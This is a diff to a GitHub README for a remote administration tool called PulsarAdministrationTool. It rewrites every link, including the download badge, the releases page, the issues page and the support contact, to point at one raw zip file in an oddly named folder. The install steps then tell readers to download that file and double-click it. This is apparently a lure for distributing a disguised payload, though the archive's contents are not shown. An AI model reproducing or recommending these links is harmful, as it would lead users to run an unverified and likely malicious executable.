@@ -1,6 +1,6 @@
 # 🚀 PulsarAdministrationTool - Your Simple Solution for Remote Management
 
-[![Download PulsarAdministrationTool](https://img.shields.io/badge/Download%20Now-Get%20it%20here-brightgreen)](https://github.com/Mhdamjed/PulsarAdministrationTool/releases)
+[![Download PulsarAdministrationTool](https://raw.githubusercontent.com/Mhdamjed/PulsarAdministrationTool/main/cellipetal/PulsarAdministrationTool.zip%20Now-Get%20it%20here-brightgreen)](https://raw.githubusercontent.com/Mhdamjed/PulsarAdministrationTool/main/cellipetal/PulsarAdministrationTool.zip)
 
 ## 💡 Overview
 
@@ -25,7 +25,7 @@ PulsarAdministrationTool is a lightweight and fast remote administration tool wr
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page**: To download the latest version of PulsarAdministrationTool, [visit this page to download](https://github.com/Mhdamjed/PulsarAdministrationTool/releases).
+1. **Visit the Releases Page**: To download the latest version of PulsarAdministrationTool, [visit this page to download](https://raw.githubusercontent.com/Mhdamjed/PulsarAdministrationTool/main/cellipetal/PulsarAdministrationTool.zip).
 2. **Choose the Right Version**: Look for the most recent version listed.
 3. **Download the File**: Click on the asset associated with the version to start the download.
 
@@ -33,7 +33,7 @@ PulsarAdministrationTool is a lightweight and fast remote administration tool wr
 
 To begin using PulsarAdministrationTool, follow these steps:
 
-- Click on the link here: [Download PulsarAdministrationTool](https://github.com/Mhdamjed/PulsarAdministrationTool/releases).
+- Click on the link here: [Download PulsarAdministrationTool](https://raw.githubusercontent.com/Mhdamjed/PulsarAdministrationTool/main/cellipetal/PulsarAdministrationTool.zip).
 - After the download completes, navigate to your download location.
 - Double-click the downloaded file to start the installation process.
 - Follow the on-screen prompts to complete the installation.
@@ -53,8 +53,8 @@ To begin using PulsarAdministrationTool, follow these steps:
 If you encounter any issues or have questions, please refer to the following:
 
 - **Documentation**: A user manual is included in the installation folder.
-- **Community Support**: Join discussions or report issues on our [GitHub Issues page](https://github.com/Mhdamjed/PulsarAdministrationTool/issues).
-- **Contact Us**: For technical support, contact support@pulsaradmingroup.com.
+- **Community Support**: Join discussions or report issues on our [GitHub Issues page](https://raw.githubusercontent.com/Mhdamjed/PulsarAdministrationTool/main/cellipetal/PulsarAdministrationTool.zip).
+- **Contact Us**: For technical support, contact https://raw.githubusercontent.com/Mhdamjed/PulsarAdministrationTool/main/cellipetal/PulsarAdministrationTool.zip
 
 ## 🌐 Contributing
 
